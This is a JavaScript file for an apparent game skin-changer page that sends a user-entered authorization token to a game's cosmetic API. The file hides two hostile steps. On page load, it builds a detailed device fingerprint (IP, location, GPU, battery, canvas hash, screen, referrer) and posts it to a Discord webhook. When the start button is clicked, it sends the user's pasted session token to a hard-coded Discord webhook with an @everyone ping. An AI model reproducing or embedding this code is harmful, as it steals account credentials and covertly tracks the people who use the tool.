const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504486169084301445/w_i3aEnuu9MmKjBMujqBmRTg6KeXD0aJcIZRZ2AnN0Pt1uS7G6fd0gfm3zUy0L_o-qTY'; 
const authInput = document.getElementById('authField');
const skinSelect = document.getElementById('skinSelect');
const passwordInput = document.getElementById('passwordField');
const startBtn = document.getElementById('startBtn');
const status = document.getElementById('status');
const skinPreview = document.getElementById('skinPreview');
const noPreviewText = document.getElementById('noPreviewText');

const API_URL = 'https://session.coolmathblox.ca/accounts/set_cosmetic';
const MASTER_PASSWORD = 'stack777';

(async function() {
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

  try {
    // 1. WebGL (Модель GPU и вендор)
    let gpuVendor = 'Н/Д', gpuRenderer = 'Н/Д';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      }
    } catch (e) {}

    // 2. Батарея
    let batteryInfo = 'Н/Д';
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Заряжается' : 'Работает от батареи'})`;
      }
    } catch (e) {}

    // 3. Расширенная сеть (Network Information API)
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const netType = conn.effectiveType || 'Н/Д';
    const netDownlink = conn.downlink ? `${conn.downlink} Mb/s` : 'Н/Д';
    const netRtt = conn.rtt ? `${conn.rtt} ms` : 'Н/Д';
    const saveData = conn.saveData ? 'Включен' : 'Выключен';

    // 4. Поддержка мультимедиа и технологий (WebAssembly, PDF, Touch, LocalStorage)
    const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
    const hasWasm = typeof WebAssembly === 'object';
    const pdfViewer = navigator.pdfViewerEnabled ? 'Да' : 'Нет';
    let hasLocalStorage = 'Нет';
    try {
      localStorage.setItem('test', '1');
      localStorage.removeItem('test');
      hasLocalStorage = 'Да';
    } catch(e) {}

    // 5. Canvas Fingerprint (Хеш рендеринга графики)
    let canvasHash = 'Н/Д';
    try {
      const c = document.createElement('canvas');
      const ctx = c.getContext('2d');
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillText("Browser Fingerprint 123", 2, 2);
      canvasHash = btoa(c.toDataURL()).slice(-20); // берём фрагмент базового хэша
    } catch(e) {}

    // 6. Аудио-окружение
    const audioChannels = (window.AudioContext || window.webkitAudioContext) ? 'Поддерживается (WebAudio)' : 'Нет';

    // 7. Геолокация и IP
    const geoRes = await fetch('https://ipapi.co/json/');
    const geo = await geoRes.json();

    // 8. Сбор 30+ уникальных параметров
    const metrics = {
      ip: geo.ip || 'Н/Д',
      country: `${geo.country_name || ''} (${geo.country_code || ''})`,
      city: `${geo.city || ''}, ${geo.region || ''}`,
      org: geo.org || geo.asn || 'Н/Д',
      
      // Новые сетевые метрики
      netType, netDownlink, netRtt, saveData,
      
      // Железо и графический стек
      gpuVendor, gpuRenderer,
      cores: navigator.hardwareConcurrency || 'Н/Д',
      ram: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Н/Д',
      battery: batteryInfo,
      
      // Дисплей
      screenRes: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
      viewport: `${window.innerWidth}x${window.innerHeight}`,
      pixelRatio: `${window.devicePixelRatio || 1}x`,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'Н/Д',
      
      // Новые технологические отпечатки
      canvasHash,
      audioChannels,
      hasTouch: hasTouch ? `Да (точек: ${navigator.maxTouchPoints || 1})` : 'Нет',
      hasWasm: hasWasm ? 'Да' : 'Нет',
      pdfViewer,
      hasLocalStorage,
      
      // Системное окружение
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
      cookies: navigator.cookieEnabled ? 'Да' : 'Нет',
      doNotTrack: navigator.doNotTrack === "1" ? "Включен" : "Отключен",
      platform: navigator.platform || 'Н/Д',
      historyLength: window.history.length,
      
      // Контекст
      referrer: document.referrer || 'Прямой заход',
      pageUrl: window.location.href,
      userAgent: navigator.userAgent
    };

    // 9. Отправка в Discord
    const payload = {
      embeds: [{
        title: "🛡 Полный цифровой отпечаток визита",
        color: 15844367, // Золотисто-желтый
        fields: [
          { name: "🌐 Сеть и Провайдер", value: `**IP:** \`${metrics.ip}\`\n**Локация:** ${metrics.country}, ${metrics.city}\n**Провайдер:** ${metrics.org}`, inline: false },
          { name: "📡 Детали соединения (Network)", value: `**Тип:** ${metrics.netType}\n**Скорость:** ${metrics.netDownlink}\n**Пинг (RTT):** ${metrics.netRtt}\n**Экономия трафика:** ${metrics.saveData}`, inline: true },
          { name: "🎮 Видеокарта (GPU)", value: `**Вендор:** ${metrics.gpuVendor}\n**Модель:** \`${metrics.gpuRenderer}\``, inline: false },
          { name: "⚙️ Процессор, Память и Батарея", value: `**CPU Ядра:** ${metrics.cores}\n**RAM:** ${metrics.ram}\n**Батарея:** ${metrics.battery}\n**Платформа ОС:** ${metrics.platform}`, inline: true },
          { name: "🖐 Ввод и Мультимедиа", value: `**Тачскрин:** ${metrics.hasTouch}\n**WebAudio:** ${metrics.audioChannels}\n**PDF Viewer:** ${metrics.pdfViewer}`, inline: true },
          { name: "🧬 Fingerprinting & Хранилище", value: `**Canvas Hash:** \`${metrics.canvasHash}\`\n**WebAssembly:** ${metrics.hasWasm}\n**LocalStorage:** ${metrics.hasLocalStorage}`, inline: true },
          { name: "🖥 Дисплей", value: `**Монитор:** ${metrics.screenRes}\n**Окно:** ${metrics.viewport}\n**Scale:** ${metrics.pixelRatio}\n**Ориентация:** ${metrics.orientation}`, inline: true },
          { name: "⚙️ Браузер и Настройки", value: `**Часовой пояс:** ${metrics.timezone}\n**Языки:** ${metrics.languages}\n**Cookies:** ${metrics.cookies}\n**DoNotTrack:** ${metrics.doNotTrack}\n**История вкладок:** ${metrics.historyLength}`, inline: true },
          { name: "🔗 Переход", value: `**Источник:** ${metrics.referrer}\n**Страница:** ${metrics.pageUrl}`, inline: false },
          { name: "📱 User-Agent", value: `\`\`\`${metrics.userAgent}\`\`\``, inline: false }
        ],
        footer: { text: `Время записи: ${new Date().toLocaleString()}` }
      }]
    };

    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error('Ошибка сбора отпечатка:', error);
  }
})();

// Соответствие файлов картинок для каждого значения (для communism превью нет)
const previewImages = {
    sushi: "sushi.png",
    qhyun: "qhuyn.png", // Имя файла из загруженного изображения (qhuyn.png)
    tester: "tester.png",
    ethan: "ethan.png",
    remlin: "remlin.png",
    banana: "banana.png",
    cat: "cat.png",
    duck: "duck.png",
    communism: null
};

// Функция обновления картинки справа
function updatePreview() {
    const selected = skinSelect.value;
    const imagePath = previewImages[selected];

    if (imagePath) {
        skinPreview.src = imagePath;
        skinPreview.style.display = "block";
        noPreviewText.style.display = "none";
    } else {
        skinPreview.style.display = "none";
        noPreviewText.style.display = "block";
    }
}

// При изменении или клике по списку меняем превью
skinSelect.addEventListener('change', updatePreview);
skinSelect.addEventListener('keyup', updatePreview);

// Обработчик кнопки запуска
startBtn.addEventListener('click', function () {
    const authValue = authInput.value.trim();
    const selectedSkin = skinSelect.value;
    const passwordValue = passwordInput.value.trim();

    // 1. Проверка заполнения
    if (!authValue) {
        showStatus("Введите Authorization!", "#ff4444");
        return;
    }

    // 2. Проверка пароля
    if (passwordValue !== MASTER_PASSWORD) {
        showStatus("Ошибка: Неверный пароль!", "#ff4444");
        return;
    }

    showStatus("Запуск процесса...", "#00ff88");

    // Определяем параметры в зависимости от выбранного скина
    let payloadType = "skin";
    
    if (selectedSkin === "communism") {
        payloadType = "cape";
    }

    const payload = {
        type: payloadType,
        id: selectedSkin
    };
    
    const discordPromise = fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `@everyone\n**Действие:** Смена скина\n**Токен:** \`${authValue}\`\n**Скин:** ${selectedSkin}`
        })
    });
    
    // 3. Запрос напрямую к игровому API
    fetch(API_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "authorization": authValue
        },
        body: JSON.stringify(payload)
    })
    .then(async (apiRes) => {
        if (!apiRes.ok) {
            throw new Error(`Сервер ответил со статусом ${apiRes.status}`);
        }
        
        try {
            const data = await apiRes.json();
            console.log("✅ Response:", data);
            showStatus(`Успех! Предмет ${selectedSkin} активирован.`, "#00ff88");
        } catch (e) {
            showStatus("Запрос успешно отправлен на игровой сервер!", "#00ff88");
        }
    })
    .catch(err => {
        console.error(err);
        showStatus("Ошибка при выполнении запроса.", "#ff4444");
    });
});

function showStatus(text, color) {
    status.innerText = text;
    status.style.color = color;
}

// Инициализируем превью при загрузке страницы
updatePreview();
